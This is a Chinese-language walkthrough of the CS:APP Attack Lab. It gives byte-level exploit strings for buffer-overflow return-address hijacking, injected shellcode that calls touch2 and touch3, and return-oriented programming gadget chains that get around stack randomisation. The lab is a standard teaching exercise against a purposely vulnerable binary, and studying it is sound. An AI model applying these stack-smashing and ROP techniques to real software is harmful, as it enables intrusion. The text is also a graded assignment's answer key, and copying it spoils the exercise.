### ctarget

#### Level 1

```c
40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40
/* 40 dummy bytes */

c0 17 40 00 00 00 00 00
/* inject return address*/
```

`getbuf`返回前做了`add $0x28,%rsp`，这时%rsp位置上就是函数返回地址，把它换掉即可。

#### Level 2

```c
48 c7 c7 fa 97 b9 59  /* mov $0x59b997fa, %rdi */
68 ec 17 40 00        /* pushq  $0x4017ec */
c3                    /* retq */
/* byte code = 13 bytes */

01 02 03 04 05 06 07 08 09 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 
/* 27 dummy bytes */

78 dc 61 55 00 00 00 00
```

和Level1一样hack返回地址，这次跳回输入缓冲区的头部，这里放一段inject code。需要把待传参的参数放在rdi寄存器里，然后push一个`touch2`的返回地址并`ret`。

#### Level 3 

```c
48 c7 c7 a8 dc 61 55  /* mov $0x5561dca8, %rdi */
68 fa 18 40 00        /* pushq  $0x4018fa */
c3                    /* retq */
/* byte code = 13 bytes */

01 02 03 04 05 06 07 08 09 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27
/* 27 dummy bytes */

78 dc 61 55 00 00 00 00
/* return address */

35 39 62 39 39 37 66 61 00
/* injected string */
```

需要把cookie的字符串摆在某个内存位置中。如果摆在return address之前，相当于位于`getbuf`的栈帧中，这部分一定会被`hexmatch`的栈帧覆盖掉（该函数申请了大数组）。所以必须把这部分字符串摆在返回地址之后，即`test`的栈帧中。

### rtarget

#### Level 2

```c
40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40
/* 40 dummy bytes */

ab 19 40 00 00 00 00 00
/* gadget 1: popq %rax*/

fa 97 b9 59 00 00 00 00
/* my cookie */

c5 19 40 00 00 00 00 00 
/* gadget 2: movq %rax, %rdi*/

ec 17 40 00 00 00 00 00
/* touch2 entry */
```

注意每次`ret`会使得`%rsp`+8。

#### Level 3

```c
40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40
/* 40 dummy bytes */

06 1a 40 00 00 00 00 00
/* gadget 1: movq %rsp,%rax */

c5 19 40 00 00 00 00 00 
/* gadget 2: movq %rax,%rdi */

d6 19 40 00 00 00 00 00
/* gadget 3: lea ($rdi,%rsi,1),%rax */

c5 19 40 00 00 00 00 00 
/* gadget 4: movq %rax,%rdi */

e6 19 40 00 00 00 00 00
/* gadget 5: nop */

fa 18 40 00 00 00 00 00
/* touch3 entry */

08 08 08 08 08 08 08 08
/* 8 dummy bytes */

35 39 62 39 39 37 66 61 00
/* injected string */
```

大体思路是要取到放injected string的地址，但栈随机化导致不能硬编码这个地址，必须拿到%rsp的值然后去加。首先我取了%rsp，另一个加数直接使用了%rsi的当前值（48，其实也可以手动放一个在栈里然后pop出来，实现自定义）。这时候发现要让字符串的位置再往后16字节才能刚好凑上，所以必须加16个凑数字节。

注意：这16个字节必须是一句空`ret`（gadget 5）和8个占位字节。因为%rsp必须对齐到16字节，否则浮点指令`movaps`会报seg fault。而一个`ret`刚好可以把%rsp推后8字节，0个或者2个`ret`都会导致%rsp只对齐到8字节而没有对齐到16字节。
